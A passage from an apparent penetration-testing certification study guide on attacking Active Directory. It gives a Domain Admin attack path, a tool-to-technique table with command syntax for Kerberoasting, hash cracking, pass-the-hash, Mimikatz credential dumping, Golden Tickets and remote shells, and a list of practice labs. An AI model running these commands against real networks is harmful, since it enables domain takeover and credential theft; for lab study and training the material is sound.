7. **Reach a Domain Admin** or a machine with DCSync rights (check BloodHound for "DCSync" edge).
8. **DCSync → krbtgt → Golden Ticket** (persistence) or just continue with DA access.
9. **Document every step** with screenshots and commands.

Always run these tools through your pivot (proxychains or Chisel SOCKS).

**Goal:** From a low-privilege domain user, reach Domain Admin and perform DCSync in under 30-45 minutes in a lab setting. Once you can reliably do this through a double pivot, the AD range in CPENT becomes very manageable.

---

## 26. Tool-to-Technique Map

| Technique | Primary Tool | Key Syntax |
|---|---|---|
| Domain/SMB fingerprinting | crackmapexec / netexec | `nxc smb <ip>` |
| Attack-path graphing | BloodHound + SharpHound | `SharpHound.exe -c All` |
| Linux BloodHound collect | bloodhound-python | `bloodhound-python -u user -d domain -c all -ns <dc-ip>` |
| LDAP enumeration | ldapsearch, ldapdomaindump | `ldapdomaindump -u user ...` |
| GPP credential decode | gpp-decrypt | `gpp-decrypt <cpassword>` |
| Kerberoasting | impacket GetUserSPNs | `impacket-GetUserSPNs -request -dc-ip <dc>` |
| AS-REP Roasting | impacket GetNPUsers | `impacket-GetNPUsers -usersfile users.txt -no-pass` |
| Hash cracking (Kerberos TGS) | hashcat | `hashcat -m 13100 hash.txt rockyou.txt` |
| Hash cracking (AS-REP) | hashcat | `hashcat -m 18200 hash.txt rockyou.txt` |
| Hash cracking (NetNTLMv2) | hashcat | `hashcat -m 5600 hash.txt rockyou.txt` |
| Hash cracking (NTLM) | hashcat | `hashcat -m 1000 hash.txt rockyou.txt` |
| Ticket manipulation | Rubeus | `Rubeus.exe golden /rc4:...` |
| Pass-the-Hash | nxc, impacket, evil-winrm | `-hashes :<ntlm>` |
| Pass-the-Ticket | Rubeus ptt / impacket | `Rubeus.exe ptt /ticket:...` |
| Golden Ticket | Rubeus / impacket-ticketer | `Rubeus.exe golden` |
| Silver Ticket | Rubeus / impacket-ticketer | `impacket-ticketer -spn cifs/...` |
| DCSync | impacket-secretsdump | `-just-dc` |
| Credential dumping | secretsdump, Mimikatz | `sekurlsa::logonpasswords` |
| Remote shell (SMB) | impacket-psexec | `domain/user:pass@<target>` |
| Remote shell (WMI) | impacket-wmiexec | `domain/user:pass@<target>` |
| Remote shell (WinRM) | evil-winrm | `-i <target> -u user -p pass` |
| Remote shell (SMB semi-interactive) | impacket-smbexec | `domain/user:pass@<target>` |
| LLMNR/NBT-NS hash capture | Responder | `sudo responder -I eth0` |
| Password spraying | nxc | `nxc smb <dc> -u users.txt -p 'Pass!'` |
| AD CS assessment | certipy | `certipy find -u user -p pass -dc-ip <dc>` |
| Delegation enumeration | impacket-findDelegation | `domain/user:pass -dc-ip <dc>` |
| DNS AD discovery | nslookup | `nslookup -type=SRV _ldap._tcp.dc._msdcs.domain` |

---

## 27. Practice

- **GOAD (Game of Active Directory):** The standard free, multi-machine, deliberately vulnerable AD lab covering nearly every technique end-to-end. Combine with pivoting since GOAD spans multiple subnets.
- **TryHackMe:** "Active Directory Basics", "Attacktive Directory", "Breaching AD", "Enumerating AD", "Lateral Movement and Pivoting", "Kerberoasting", "ADCS", "Post-Compromise" rooms.
- **HackTheBox:** AD-labeled machines ("Active", "Forest", "Sauna", "Cascade"), Sherlocks/Pro Labs (Rastalabs, Offshore, APT labs).
- **Local Lab:** Two Windows Server VMs (one DC, one joined member server) + a Windows 10/11 client VM. Practice Kerberoasting, GPP decryption, PtH/PtT, BloodHound mapping, DCSync by hand.
